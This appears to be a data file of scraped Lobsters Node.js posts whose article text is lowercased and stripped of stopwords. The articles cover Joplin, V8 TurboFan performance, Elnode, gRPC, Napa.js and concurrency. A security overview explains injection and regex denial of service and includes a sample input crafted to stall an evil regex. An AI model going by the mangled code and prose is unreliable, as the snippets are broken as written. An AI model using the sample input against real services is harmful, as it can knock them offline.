full regardless formatting import evernote data first export evernote notebook enex file described follow step desktop application open file import enex select file note imported new separate notebook needed moved different notebook notebook renamed etc terminal application commandline mode type import pathtofileenex import note new notebook named filename importing markdown joplin import note plain markdown file either import complete directory markdown file individual file desktop application open file import md select markdown file directory terminal application commandline mode type import format md pathtofilemd import format md pathtodirectory importing general way import note application joplin convert note enex file evernote format import enex file joplin using method notetaking application support enex file relatively straightforward help specific application see joplin export jex format joplin export file tar file contain multiple note notebook etc lossless format note also metadata geolocation updated time tag etc preserved format convenient backup purpose reimported joplin raw format also available jex format except data saved directory item represented single file one goal joplin avoid tied particular company service whether evernote google microsoft synchronisation designed without hard dependency particular service synchronisation process done abstract level access external service nextcloud dropbox done via lightweight driver easy support new service creating simple driver provide filesystemlike interface ie ability read write delete list item also simple switch one service another even sync multiple service note notebook tag well relation item transmitted plain text file synchronisation mean data also moved different application easily backed inspected etc currently synchronisation possible nextcloud dropbox onedrive local filesystem enable synchronisation please follow instruction application synchronise background whenever running click synchronise start synchronisation manually nextcloud nextcloud selfhosted private cloud solution store document image video also calendar password countless thing sync laptop phone host nextcloud server data device infrastructure used synchronisation good fit joplin platform also well supported strong community likely around since open source anyway service closed exist server long one chooses desktop application mobile application go config screen select nextcloud synchronisation target input webdav url get click setting bottom left corner page nextcloud normally http examplecomnextcloudremotephpwebdavjoplin make sure create joplin directory nextcloud set username password work please see explanation detail terminal application need set synctarget config variable config variable respectively nextcloud webdav url username password done command line mode using config http examplecomnextcloudremotephpwebdavjoplin config yourusername config yourpassword config synctarget synchronisation work please consult log app profile directory often due misconfigured url password log indicate exact issue dropbox syncing dropbox joplin creates subdirectory dropbox appsjoplin readwrite note notebook application access anything outside directory desktop application mobile application select dropbox synchronisation target config screen selected default initiate synchronisation process click synchronise button sidebar follow instruction terminal application initiate synchronisation process type sync asked follow link authorise application possible also synchronise outside user interface typing joplin sync terminal used setup cron script synchronise regular interval example would every minute pathtojoplin sync webdav select webdav synchronisation target follow instruction nextcloud webdavcompatible service known work joplin onedrive syncing onedrive joplin creates subdirectory onedrive appsjoplin readwrite note notebook application access anything outside directory desktop application mobile application select onedrive synchronisation target config screen initiate synchronisation process click synchronise button sidebar follow instruction terminal application initiate synchronisation process type sync asked follow link authorise application simply input microsoft credential need register onedrive joplin support endtoend encryption application system owner note notebook tag resource read prevents potential eavesdropper including telecom provider internet provider even developer joplin able access data please see endtoend encryption tutorial information feature enable technical description mostly relevant development review method used please see encryption specification note joplin application automatically save previous version note regular interval version synced across device viewed desktop application click information button note click previous version note screen view previous version note well restore feature disabled note history section setting also possible change long history note saved information feature announcement post external text joplin note opened edited using external editor choice simple text editor like notepad sublime text actual markdown editor like typora case image also displayed within editor open note external editor click icon toolbar press ctrle cmde default text editor used open note needed also specify editor directly general option text editor command kind file attached note markdown link file represented simple id attachment note viewer file image displayed file pdf text file etc displayed link clicking link open file default application desktop application file attached either clicking attach file icon editor via drag drop prefer create link local file instead hold alt key performing drag drop operation also copy paste image directly editor via ctrlv resource attached note automatically deleted accordance note history setting important resource larger mb currently supported mobile crash application synchronising recommended attach resource moment issue looked downloading way attachment downloaded synchronisation customised configuration screen attachment download behaviour default option always download attachment time data available even device offline also option download attachment manually option manual clicking automatically option auto case attachment downloaded note opened option help saving disk space network bandwidth especially mobile desktop mobile apps alarm associated todo triggered given time displaying notification notification displayed depends operating system since different way handle please see requirement desktop application window make sure action center enabled window task bar balloon window growl fallback growl take precedence window balloon macos growl earlier linux notifyosd libnotifybin installed ubuntu default growl otherwise see documentation flow chart reporter choice mobile alarm displayed using builtin notification system reason notification work please open issue subnotebooks allow organising multiple notebook tree notebook example used regroup notebook related work family particular project parent notebook desktop application create subnotebook drag drop onto another notebook move back root drag drop notebook header currently desktop app used organise notebook mobile application support displaying collapsingexpanding tree notebook however currently support moving subnotebooks different notebook terminal app support displaying tree subnotebooks support collapsingexpanding moving subnotebooks around joplin us render githubflavoured markdown variation addition particular add math formula support interactive checkboxes support note link joplin also support markdown plugins allow enabling disabling various advanced markdown feature look markdown guide information custom rendered markdown customized placing userstyle file profile directory configjoplindesktopuserstylecss path might different device check top config screen exact path file support standard cs syntax joplin must restarted new cs applied please ensure joplin closing tray actually exiting note file used displaying note printing note aware cs may look printed example printing white text black background usually wanted whole ui customized placing custom editor style file profile directory configjoplindesktopuserchromecss important userstylecss userchromecss provided convenience advanced setting style define may break one version next want use please know might require regular development work keep working joplin team make commitment keep application html structure stable note desktop app template used create new note insert existing one creating template folder joplin config folder placing markdown template file example creating file hoursmd template directory content date date hour detail template inserted menu file template currently supported template variable variable description example date today date formatted based setting format time current time formatted based setting format datetime current date time formatted based setting format pm customdatetime current date andor time formatted based supplied string using momentjs formatting customdatetime customdatetime joplin implement sqlite full text search extension mean content note indexed real time search query return result fast simple ft query fulltext index query supported see list supported query search type description example single word return note contain term example searching cat return note contain exact word note return note contain substring thus cat note contain cataclysmic prevaricate returned multiple word return note contain word necessarily next dog cat return note contain word dog cat anywhere note necessarily order next return result contain dog cat phrase add double quote return note contain exactly phrase shopping list return note contain exact term next order return example note contains going shopping list prefix add wildcard return note contain term specified prefix swim return note contain eg swim also swimming swimsuit etc important wildcard end ignored beginning word eg swim treated literal asterisk middle word eg ast rix field restricted add either title body note restrict search title body title shopping body egg switch basic search one drawback full text search ignores nonalphabetical character however case might want search use basic search switch mode prefixing search slash wo nt provide benefit ft allow searching exactly need note also much slower even extremely slow depending query return note contain unchecked checkboxes note sorted relevance currently mean note contain requested term time top query multiple term also matter close term bit experimental notice search query return unexpected result please report forum providing many detail possible replicate issue goto desktop application press ctrlg cmdg type note title part content jump type followed tag name followed notebook name joplin value privacy security giving complete control information digital footprint joplin application send data service without authorisation data joplin save note image saved device free delete data time joplin many modern feature use thirdparty service disable feature application setting feature feature description default autoupdate joplin periodically connects github check new release enabled geolocation joplin save geolocation information note property create note enabled synchronisation joplin support synchronisation note across multiple device choose synchronise thirdparty onedrive note sent onedrive account case thirdparty privacy policy applies disabled joplin developed opensource application source code freely available online inspect question joplin privacy please leave message joplin forum donation joplin support development project developing quality application mostly take time also expense digital certificate sign application app store fee hosting etc donation make possible keep current development standard please see donation page information support development joplin please see guide information contribute development joplin http joplin currently available language would like contribute new translation quite straightforward please follow step download poedit translation editor install download file translated poedit open pot file go catalog menu click configuration change country language country language translate file done please open pull request add file translation apply three application desktop mobile terminal update translation follow step instead getting pot file get po file language table current translation thank everyone contributed joplin source code known resource larger mb currently supported mobile crash application nonalphabetical character chinese arabic might create glitch terminal window limitation current window console mit license copyright c laurent cozic permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software
241,Lobsters,nodejs,Node.js programming,"Get ready: A new V8 is coming, Node.js performance is changing.",https://www.nearform.com/blog/node-js-is-getting-a-new-v8-with-turbofan/,get ready new coming nodejs performance changing,performance characteristic turbofan affect way optimize franziska hinkelmann benedikt meurer shipped turbofan yang guo matteo collina http benchmarkjs trycatch problem code http found performance bug removing property object code http jakob kummerow jakob kummerow leaking arrayifying code http partial application currying binding code http function character count code http abstract syntax tree whitespace variable name character count function signature comment longer factor whether function inline integer v integer stored double jakob kummerow yang guo iterating object code http http object allocation code http http object allocation elimination object allocation http http polymorphic v monomorphic code jakob kummerow keyword summary realworld benchmark logger comparison pino summary david mark clements matteo collina franziska hinkelmann benedikt meurer http http uspsharing,performance characteristic turbofan affect way optimizereviewers franziska hinkelmann benedikt meurer team update nodejs shipped turbofansince inception nodejs depended javascript engine provide code execution language know love javascript engine javascript vm written google chrome browser beginning primary goal make javascript fast least faster competition highly dynamic loosely typed language easy feat piece evolution j engine performancea central piece engine allows execute javascript high speed jit time compiler dynamic compiler optimize code runtime first built jit compiler dubbed fullcodegen team implemented crankshaft included many performance optimization fullcodegen implementedit fullcodegen first optimizing compiler thanks yang guo reportingas outside observer user javascript since seemed fast slow path javascript whatever engine may often counterintuitive reason apparently slow javascript code often difficult fathomin recent year matteo collina focused finding write performant nodejs code course mean knowing approach fast approach slow code executed javascript enginenow time u challenge assumption performance team written new jit compiler turbofanstarting commonly known killer piece code cause optimization bailout term longer make sense turbofan context moving towards obscure discovery matteo made around crankshaft performance going walk series microbenchmark result observation progressing version course optimizing logic path first focus api design algorithm data structure microbenchmarks meant indicator javascript execution node changing use indicator influence general code style way improve performance applied usual optimizationswe looking performance microbenchmarks version put version context engine used node us crankshaft jit compiler used node us mixture crankshaft turbofancurrently engine due node possibly node version latest version time writing integrated node experimental repo http word version eventually future version node likely nodejs take look microbenchmarks side talk mean future microbenchmarks executed using benchmarkjs value plotted operation per second higher better every diagramthe trycatch problemone wellknown deoptimization pattern use trycatch blocksin microbenchmark compare four case function trycatch sum try catch function without trycatch sum without try catch calling function within try block sum wrapped simply calling function trycatch involved sum function code http see existing wisdom around trycatch causing performance problem true node significantly le performance impact node also note calling function within try block much slower calling outside try block hold true node node however node performance hit calling function inside try block negligiblenevertheless rest easy working performance workshop material matteo found performance bug rather specific combination circumstance lead infinite deoptimizationreoptimisation cycle turbofan would count killer pattern destroys performance removing property objectsfor year delete offlimits anyone wishing write highperformance javascript well least trying write optimal code hot path problem delete boil way handle dynamic nature javascript object also potentially dynamic prototype chain make property lookup even complex implementation levelthe engine technique making property object high speed create class c layer based shape object shape essentially key value property including prototype chain key value known hidden class however optimization occurs object runtime uncertainty shape object another mode property retrieval hash table lookup hash table lookup significantly slower historically delete key object subsequent property access hash table lookup avoid delete instead set property undefined lead result far value concerned may problematic checking property existence however often good enough preserialization redaction jsonstringifydoes include undefined value output undefined valid value json specification let see newer turbofan implementation address delete problemin microbenchmark compare three case serializing object object property set undefinedserializing object delete used remove object property last property addedserializing object delete used remove object recently added propertycode http yet used node release deleting last property added object hit fast path thus faster even setting undefined excellent news show team working towards improving performance delete however delete operator still result significant performance hit property access property recently added property deleted object overall continue recommend using deleteedit previous version post concluded delete could used future nodejs release however jakob kummerow let u know benchmark triggered last property accessed case thanks jakob kummerow leaking arrayifying argumentsa common problem implicit argument object available normal javascript function opposed fat arrow function argument object arraylike arrayin order use array method array behaviour indexing property argument object copied array past javascripters propensity towards equating le code faster code whilst rule thumb yield payloadsize benefit browserside code rule cause pain server side code size far le important execution speed seductively terse way convert argument object array became quite popular arrayprototypeslicecall argument call array slice method passing argument object context method slice method see object quack like array act accordingly take slice entire argument arraylike object arrayhowever function implicit argument object exposed context function instance returned function passed another function case arrayprototypeslicecall argument typically cause performance degradation time challenge assumptionthis next microbenchmark measure two interrelated topic across four version cost leaking argument cost copying argument array subsequently exposed function scope place argument object case detail exposing argument object another function array conversion leaky argument making copy argument object using arrayprototypeslice trick array prototypeslice argument using loop copying property across forloop copy argument using ecmascript spread operator assign array input reference spread operator code http let take look data line graph form emphasise change performance characteristic takeaway want write performant code around processing function input array experience seems fairly common node use spread operator node use loop copy key argument new preallocated array see benchmark code detail node punished exposing argument object function may performance benefit case need full array make arraylike structurepartial application currying bindingpartial application currying refers way capture state nested closure scopesfor instance function add b return b const function n return add n consolelog parameter add partially applied value functiona terser form partial application made available bind method since ecmascript function add b return b const addbind null consolelog however would typically use bind demonstrably slower using closurethis benchmark measure difference bind closure target version direct function call controlhere four case function call another function first argument partially applied curry fat arrow function call another function first argument partially applied fat arrow curry function created via bind partially applies first argument another function bind direct call function without partial application direct call code http line graph visualization benchmark result clearly illustrates approach converge later version interestingly partial application using fat arrow function significantly faster using normal function least microbenchmark case fact almost trace performance profile making direct call node node bind slow comparison seems clear using fat arrow partial application fastest option however bind speed order magnitude version node becoming fastest approach almost negligible amount version future node fastest approach currying version using fat arrow function code using fat arrow function later version close using bind make odds currently faster using normal function however caveat probably need investigate type partial application differently sized data structure get fuller picturefunction character countthe size function including signature white space even comment affect whether function inlined yes adding comment function may cause performance hit somewhere range speed reduction change turbofan let find outin benchmark look three scenario call small function sum small function operation small function performed inline padded comment long altogether call big function padded comment sum long function code http node sum small function long together equal perfectly illustrates inlining work calling small function writes content small function place called actually write content function even extra comment padding manually inlined operation performance equivalent see node calling function padded comment take past certain size lead much slower executionin node situation pretty much except cost calling small function noticeably increased may due smushing together crankshaft turbofan element whereas one function may crankshaft may turbofan causing disjoints inlining ability ie jump cluster serially inlined function upwards node size added irrelevant character whitespace comment bearing performance function turbofan us function ast abstract syntax tree node count determine function size rather using character count crankshaft instead checking byte count function considers actual instruction function node whitespace variable name character count function signature comment longer factor whether function inlinenotably see overall performance function decreasesthe takeaway still keep function small moment still avoid overcommenting even whitespace inside function also want absolute fastest speed manually inlining removing call consistently fastest approach course balanced fact certain size actual executable code function inlined copypasting code function function could cause performance problem word manual inlining potential footgun better leave inlining compiler integer v integer stored doublesit rather well known javascript one number type numberhowever implemented c choice made underlying type numeric javascript valuein case integer specify number j without decimal assumes number fit bit seems like fair choice since many case number within range javascript whole number exceeds jit compiler dynamically alter underlying type number double doubleprecision floating point number may also potential knockon effect regard optimizationsthis benchmark look three case function handling number range sum small function handling combination double number small big function handling double number big see graph whether node node even future version node observation hold true operation using number integer greater cause function run half twothirds speed long numeric id put stringsit also quite noticeable operation number range speed increase node node slow significantly node however operation double number become faster node likely genuinely slowdown number handling rather related speed function call loop used benchmark code edit updated thanks jakob kummerow yang guo team accuracy precision resultsiterating objectsgrabbing object value something common task many way approach let find fastest across node versionsthis benchmark measure four case version benched using loop hasownproperty check get object value using objectkeys iterating key using array reduce method accessing object value inside iterator function supplied reduce objectkeys functional using objectkeys iterating key using array reduce method accessing object value inside iterator function supplied reduce iterator function fat arrow function objectkeys functional arrow looping array returned objectkeys loop accessing object value within loop objectkeys loop also benchmark additional three case objectvalues iterating value using array reduce method objectvalues functional using objectvalues iterating value using array reduce method iterator function supplied reduce fat arrow function objectvalues functional arrow looping array returned objectvalues loop objectvalues loop bench case node support native ecmascript objectvalues method code http node node using far fastest way loop object key access value object roughly million operation per second time faster next closest approach objectkeys around million opsin node something happens cut one quarter speed former version still faster approachin future node speed objectkeys leap forward becomes faster using near speed node node driving principle behind turbofan seems optimize intuitive coding behavior optimize case ergonomic developerusing objectvalues get value directly slower using objectkeys accessing value object top procedural loop remain faster functional programming may work come iterating objectsalso used performance benefit going painful moment lose large chunk speed alternative approach availablenote loop performance fixed see http detail change likely integrated node allocationwe allocate object time great area measurewe going look three case allocating object using object literal literal allocating object ecmascript class class allocating object constructor function constructor code http object allocation cost test version apart class node slower rest due mixed crankshaftturbofan nature resolved node jakob kummerow noted http turbofan optimize away object allocation specific microbenchmark leading incorrect result article edited accordinglyobject allocation eliminationwhile collating result article came across really neat optimization turbofan brings certain category object allocation originally mistook object allocation thanks input team come understand circumstance optimization relates toin previous object allocation benchmark assign variable set null reassign variable bunch time avoid triggering special optimization case going look nowin benchmark look three case allocating object using object literal literal allocating object ecmascript class class allocating object constructor function constructor however difference reference object overwritten additional object allocation object passed another function performs task objectlet take look result notice node node yield massive jump speed case million operation per second mainly nothing really happening turbofan applies optimization particular scenario turbofan able optimize away object allocation able determine subsequent logic executed without requiring existence actual objectthe benchmark code still fully demonstrate take trigger optimization condition take optimization applied complexhowever one condition know definitely allow object optimized away turbofan follows object must outlive function created mean reference object every function point stack completed object passed function add object context assign outer scoped variable add another object life stack finished optimization appliedthe ramification could pretty cool however difficult predict condition optimization occurs nevertheless may lead yield useful speedup complex set condition metedit thanks jakob kummerow rest team helping u discover underlying reason particular behaviour part research discovered performance regression new gc orinoco interested checkout http http v monomorphic codewhen always pas type argument function say always pas string using function monomorphic waysome function written polymorphic think polymorphic function function accepts different type argument position instance function may accept either string object first argument however context say type mean string versus number versus object mean object shape although javascript type actually count different object shape well shape object defined property value instance following snippet shape different shape rest const const const b const b processing object different shape code make nice interface circumstance tends negative impact performancelet see monomorphic polymorphic case benchmarkshere investigate two case function process object different property polymorphic function process object property monomorphic data visualized graph show conclusively monomorphic function outperform polymorphic function across version tested however performance polymorphic function improves mean improves node us polymorphic function common nodejs codebase provide great deal flexibility apis thanks improvement around polymorphic interaction may see degree improved performance complex nodejs applicationsif writing code need optimal function called many time commit call function parameter shape hand function called twice say instantiatingsetup function polymorphic api acceptableedit thanks jakob kummerow providing reliable version benchmarkthe debugger keywordfinally let talk debugger keywordbe sure strip debugger statement code stray debugger statement destroy performancewe looking two case function contains debugger keyword debugger function contain debugger keyword without debugger yep presence debugger keyword terrible performance across version testedthe without debugger line noticeably drop successive version talk summarya realworld benchmark logger comparisonin addition microbenchmarks take look holistic effect version using benchmark popular logger nodejs matteo put together creating pinothe following bar chart represents time taken log thousand line lower better popular logger nodejs crankshaft following benchmark using turbofan logger benchmark improve speed roughly winston logger derives benefit new turbofan jit compiler seems demonstrate speed convergence see among various approach microbenchmarks slower approach crankshaft significantly faster turbofan fast approach crankshaft tend get little slower turbofan winston slowest likely using approach slower crankshaft much faster turbofan whereas pino optimized use fastest crankshaft approach speed increase observed pino much lesser degreesummarysome benchmark show slow case become faster advent full turbofan enablement fast case also slow often matching increased speed slow casesmuch due cost making function call turbofan idea behind turbofan optimize common case eliminate commonly used killer resulted net performance benefit chrome browser server node application tradeoff appears least initially speed decrease performant case logger benchmark comparison indicates general net effect turbofan characteristic comprehensive performance improvement even across significantly contrasting code base eg winston v pino eye javascript performance adapted coding behaviour quirk underlying engine nearly time unlearn technique focused best practice writing generally good javascript well done thanks team tireless effort performance reward comingthis article cowritten david mark clements matteo collina reviewed franziska hinkelmann benedikt meurer teamall source code another copy article could found http raw data article found http uspsharingmost microbenchmarks taken macbook pro ghz intel core gb mhz others number property removal polymorphic object creation taken macbook pro different nodejs version taken machine took great care assuring program interferingwill
242,Lobsters,nodejs,Node.js programming,Elnode: Backend web services in elisp,https://www.emacswiki.org/emacs/Elnode,elnode backend web service elisp,httpserver emacslisp elnode emacslisp emacslisp nodejs select function elnode good emacslisp nodejs using builtin wiki example elnode org example nicferrier github project getting elnode elnode database elnode nicferrier mongodb postgresql talking elnode tutorial elnode nicferrier categoryextensions,elnode asynchronous httpserver framework use write http service emacslisp elnode access log bufferwhat elnode iselnode nonblocking io webserver written entirely emacslisp like emacslisp version nodejselnode performance better expected get request per second limiting factor likely emacs async io us select function replacing epoll fast equivalent would likely give u nodejs like performanceelnode come webserver wiki server applicationwhat elnode good elnode optimized rapid development designed get going quickly emacs great development environment emacslisp elnode application rapid easy buildsome suggestion elnode useful personal webserver easy mix file serving wiki serving hackselnode serve emacs data especially exciting emacs data often locked away like diaryelnode defer processing could also used writing general purpose comet apps nodejs nodejs evented io server framework javascript nodejs browser thing server side thing write event driven server mean write code single process rely natural blocking client give concurrency course standard technique spawn process handle work communicating asynchronouslyusing builtin wikiinstalling latest version elnode automatically install working wiki webserver apps listening port webserver default serf file example included emacsdelnodepublichtml lot stuff builtin webserver including serf file configured elnode customizations mx customizegroup ret elnode ret see allthe wiki server default serf wiki page emacsdelnodewiki configured tooan example elnodewant publish directory orgmode file full elnode program defines handler publish org file directory also start server port defvar myorgdir workorg defun myelnodeorghandler httpcon elnodedocrootfor myorgdir orgfile httpcon withcurrentbuffer findfilenoselect orgfile let orghtml orgexportashtml nil string elnodesendhtml httpcon orghtml elnodestart myelnodeorghandler port visit one file directly bit work would adding index could pick orgfile wanted look atmore org exampleslot people ask orgmode elnode integration nicferrier started specific github project package tool utilsgetting elnodethe latest version elnode latest development version elnode includes magic make webserver wiki work box configproper child processing async spawned child process communicate elnode serversfixes bit piece version planned include easy logging processesheroku runnabilitya stable vagrant imagea stable ami running elnode amazon databasesbecause database access important part web application elnode includes simple database layer builtin implementation serializes lisp object filesother database implementation worked nicferrier working mongodb implementation postgresql implementationtalking elnodewe talk elnode emacs often shout people emacs know quite lot elnode toowe mailing list yet would like provide one ad free please please get toucha tutorial elnodepeople asked tutorial nicferrier started make one progress hereyou need latest version elnode make tutorial workcategoryextensions
243,Lobsters,nodejs,Node.js programming,Node.js Security Overview,https://nemethgergely.com/nodejs-security-overview/,nodejs security overview,security matter saying go attacker need get thing right application developer right time pwned troy hunt nodejs security nodejs core security working group github repository responsible disclosure potential security issue security nodejsorg nodejs security security npm ecosystem securing nodejs application using helmet module official documentation helmet validating user input command injection sql injection stored crosssite scripting joi sequelize securing regular expression regular expression denial service evil regexes example evil regular expression pattern saferegex securitytxt securitytxt draft expresssecuritytxt outro resource reading company helping nodejs security lift security nsp snyk sqreen nodesource,initial nodejs release happened little bit year ago since nodejs became one leading platform building backend application security becomes importantin first part article learn nodejs npm come security second part learn best security practice immediately apply nodejs applicationswhy security matter nodejs developer probably work huge amount user data sensitive nature business built cloudnative era always treat data topmost respectas saying go attacker need get thing right application developer right timeone best example website called pwned operated troy hunt collect security breach make publicly available breach searchable know one account may got exploited breached website include linkedin adobe myspace name bigger onesbut nodejs security nodejs coreas today nodejs core contributor maintain many different channel address security nodejs project security usersin nodejs interactive austin security working group formed addressing need working group focusing security mainly responsible defining maintaining security policy procedure core nodejs project project maintained nodejs foundationthe security working group also help nodejs security project bring vulnerability data foundation review recommend process handling security report recommend security improvement core nodejs project facilitate promote expansion healthy security service product provider ecosystem vulnerabilitiesfor information check security working group github repositoryresponsible disclosure potential security issuesif feel like found security bug nodejs report security nodejsorg email acknowledged within hour needed security team may ask detail next hoursto better understand process read full disclosure policy check official nodejs security pagesecurity npm ecosystemnpm far biggest package ecosystem world half million package growing new module daily download package billion time every week scale security ecosystem topmost prioritiesas responsible maintainer developer registry npm make important step towards making npm secure every step road like continue reading article take minute enable twofactor authentication npm account http docsnpmjscomgettingstartedusingtwofactorauthentication even npm everything power secure registry still happen module security vulnerability application easily end depending hundred thousand module auditing one start using something time doluckily nodejs security project well snyk maintains security advisory company offering paid subscription plan run tool cicd environment securing nodejs applicationsit time get hand make application secure follow implement next item carefully already making great progress towards secure nodejs applicationusing helmet modulehelmet help secure express application setting various http header like helmet support lot header get full list visit official documentation helmetadding helmet application line code express require express const helmet require helmet const app express appuse helmet validating user inputvalidating user input one important thing come security application failing correctly open application user wide range attack including command injection sql injection stored crosssite scriptingto validate user input one best library pick joi joi object schema description language validator javascript object get idea take look following joi require joi const schema joiobject key username joistring alphanum min max required password joistring regex accesstoken joistring joinumber birthyear joinumber integer min max email joistring email username birthyear without password accesstoken const result joivalidate username abc birthyear schema come validating user input passed sql query always escape user provided data using sql query combination validating user input using mysql module look something like update user set foo bar baz id b c userid function error result field using orm like sequelize come concept prepared statement also sometimes referred parameterized statement like mysql module understands encode properlysecuring regular expressionsregular expression great way manipulate text get part need however attack vector called regular expression denial service attack expose fact regular expression implementation may reach extreme situation specially crafted input cause work extremely slowlycombined fact nodejs singlethreaded nature single user input whole server taken regular expression thing commonly referred evil regexes expression contain grouping repetition inside repeated group repetition oralternation overlappingexamples evil regular expression pattern potential input cause first regular expression run slowly aaaaaaaaaaaaaaaaaaaaaaaaxto detect regular expression use saferegex modulesecuritytxtsecuritytxt defines standard help organization define process security researcher securely disclose security vulnerability currently draft stage following intended purpose security risk web service discovered independent security researcher understand severity risk often lack channel properly disclose result security issue may left unreported securitytxt defines standard help organization define process security researcher securely disclose security vulnerability securitytxt draftin case like add application help researcher report security bug published nodejs module make super easy called expresssecuritytxt adding app easy express require express const securitytxt require expresssecuritytxt const app express appget securitytxt securitytxt contact email examplecom encryption encryption acknowledgement http acknowledgementsexamplecom outroi hope article helped better understand security nodejs ecosystem work step make make nodejs application secure miss something important please let know comment section readingscompanies helping nodejs securitylift security penetration testing application securitynsp continuous security monitoring node appssnyk continuously find fix vulnerability dependenciessqreen web application user protectionnodesource runtime module security apps
244,Lobsters,nodejs,Node.js programming,Bridging Rails & NodeJS with gRPC,https://product.reverb.com/bridging-rails-nodejs-with-grpc-5cb58e03189c,bridging rail nodejs grpc,bridging rail nodejs grpc server side rendering react component rail view unix socket grpc grpc protocol buffer define schema analytics pipeline tracking pixel protocol buffer generating client server code proto grpctools generating ruby code great documentation fork issue grpc github tracker bright grpc filled future question erik benoist,bridging rail nodejs grpcsome tool better fit job hand building uis react evolved largely server side rendered application mix client server side rendered view found duplicating ui code make sure layout reshuffle client renderer took solved problem small nodejs service provides server side rendering react component rail view today service handle thousand request minute return component around service communicated rail application via unix socket simple fast way get data nodejs service back rail application little overhead fast requires u deploy react rendering engine rre alongside one application server requirement complicates deployment scaling story started look replacement communication mediumgrpcgrpc high performance open source rpc framework google complement protocol buffer serialization format defining service interaction addition messaging format use protocol buffer define schema analytics pipeline tracking pixel started using internal service communication protocol buffer solve one part growing pain internal service communication defining hard contract speedy serialization format solve problem like endpoint discovery documentation shared high quality client server code number different languagesgenerating client server codedefining interface react rendering engine proto file simplerreprotowe define message request response autogenerate structs use ruby nodejs application help maintain contract service service portion defines rpc interface client serverusing grpc tool autogenerate client service stub u use ruby nodejs first need install dependenciesgenerating message structs nodejs ruby requires protoc compiler installedbrew install protobufto generate ruby grpc code need grpctools nodejs ruby need add grpc library projectyarn add grpcand ruby bundle add grpc grpctoolsgenerating ruby codealright let generate client server code bundle exec grpctoolsrubyprotoc lib rubyoutlib grpcoutlib rrerreprotonot bad almost actually wrote generates fully functional client stub implement service provide great documentation implement service stub variety different languagesnow client done let write server code nodejs version grpc need generate thing pull service definition okay got service running let call ruby clientand go rail nodejs service talking barely written actual code done right thought shipped first version staging environment everything ground haltwhat fork using forking application server ruby side like unicorn puma need make sure initialize client afterfork hook start client fork grpc framework timeout call read issue grpc github trackerour bright grpc filled future first foray grpc great alternative hand rolling http client use json wire internal service communication grpc also provides number new feature eager try stack async client streaming message high throughput service library internal service communication polyglot environment grpc provides excellent tooling documentation suspect continuing experiment growif passion building great product always looking folk join band reverbquestions erik benoist
245,Lobsters,nodejs,Node.js programming,Napa.js - Microsoft's open-source multithreaded JS runtime,https://github.com/Microsoft/napajs,napajs microsoft opensource multithreaded j runtime,napajs nodejs installation build napajs quick start feature documentation contribute report issue source code change microsoft open source code conduct code conduct faq opencode microsoftcom license mit,napajs napajs multithreaded javascript runtime built originally designed develop highly iterative service noncompromised performance bing evolves find useful complement nodejs cpubound task capability executing javascript multiple isolates communicating napajs exposed nodejs module also embedded host process without nodejs dependency installation install latest stable version npm install napajs option found build napajs quick start const napa require napajs const napazonecreate worker broadcast code worker consolelog hello world execute anonymous function worker thread text text hello napa result consolelog resultvalue example feature multithreaded javascript runtime nodejs compatible module architecture npm support api object transportation object sharing synchronization across javascript thread api pluggable logging metric memory allocator distributed nodejs module well supporting embed scenario documentation contribute contribute napajs following way report issue help u verify fix checked review source code change contribute core module compatibility node contribute bug fix project adopted microsoft open source code conduct information see code conduct faq contact opencode microsoftcom additional question comment license copyright c microsoft corporation right reserved licensed mit license
246,Lobsters,nodejs,Node.js programming,Concurrency vs Parallelism and the Erlang Advantage,http://nathanmlong.com/2017/06/concurrency-vs-paralellism/,concurrency v parallelism erlang advantage,burrito shop burrito strategy serial burrito strategy concurrent two burrito partial state completion moment burrito strategy parallel two burrito actively worked back computer two way scheduling cooperative multitasking preemptive multitasking make whole system hang erlang advantage beam book caveat starting talk solid ground,concurrency parallelism term get used lot development discussion especially elixir erlang circle mean let talk using burrito burrito shop suppose work burrito shop two customer come order burrito get work done burrito strategy serial work serially get one tortilla fill yummy stuff close get next tortilla neither concurrent parallel burrito strategy concurrent work concurrently get one tortilla spread get another tortilla spread making two burrito concurrently two burrito partial state completion moment switch burrito bit work first second first second however one set hand actively working one burrito given moment nt increase amount work per second may increase number productive second get instance suppose ca nt finish first burrito coworker make guacamole concurrent strategy allowed put aside minute work second burrito without concurrency stand staring awkwardly customer guacamole ready burrito strategy parallel work parallel get coworker help spread tortilla filling first one coworker would filling second took photo moment notice two burrito partial state completion work concurrent also two burrito actively worked moment mean work done parallel actually getting burritomaking done per second notice scenario ability work concurrently precondition parallel example nt enough counter space two burrito coworker ca nt work time nt coworker counter space world wo nt turn concurrency parallelism back computer computer operating system generally supported concurrency long got true parallelism one cpu could still running multiple program one appeared running simultaneously truth computer switching task quickly individual burst work seemed slow human eye blur one continuous activity like page flip book later got multiple cpu per machine computer could actually multiple task time cpu task still switching task create illusion switching task called scheduling computer decide task work given moment done important two way scheduling one way scheduling done one way called cooperative multitasking mean task must polite say finished someone else turn nice designing single process know never interrupted unexpectedly cooperative scheduling also mean greedy slow hung process bring whole system halt everyone waiting process hand control never preemptive multitasking mean scheduler involved scheduler say essentially process take turn turn n microsecond long finish work much time great force pause give someone else cpu get back line continue turn introduces overhead every time process pause little time wasted term raw speed cooperative multitasking better waste le time switching task preemptive multitasking make overall system performance predictable since one big buggy task ca nt delay smaller task much nt want one inefficientlywritten program one unexpectedly large task make whole system hang reason nearly operating system today use preemptive multitasking erlang advantage erlang vm known beam erlang elixir code run sometimes called operating system code like system o allows parallel execution us preemptive multitasking basically see beam book caveat contrast example nodejs singlethreaded us cooperative multitasking nodejs juggle io task efficiently single slow computation could bring work halt beam loses bit raw speed switching task much payoff performs consistently example suppose phoenix application people upload data processing respond processed data suppose parse large xml api response order respond phoenix fronted cowboy every incoming request get beam process request small occasionally get expensive request problem incoming request wo nt affected heavy process keep getting paused give one turn true whether heavy process waiting io performing long computation multiple core beam use get work done parallel core outweighs raw speed course web service heavy computation background respond asynchronously using beam option requirement wo nt kill site synchronously make decision based user experience uptime want know bryan hunter talk every nodejs developer need know elixir nice explanation concurrency parallelism beam scheduler starting update talk solid ground published since wrote article talk beam concurrency model basis predictable performance reliability nice quote runtime foundation ground ground solid move top lot confidence steady reasonable pace start building system confidently watch grow way beyond original plan imagination ask language syntax library framework first foremost ask runtime
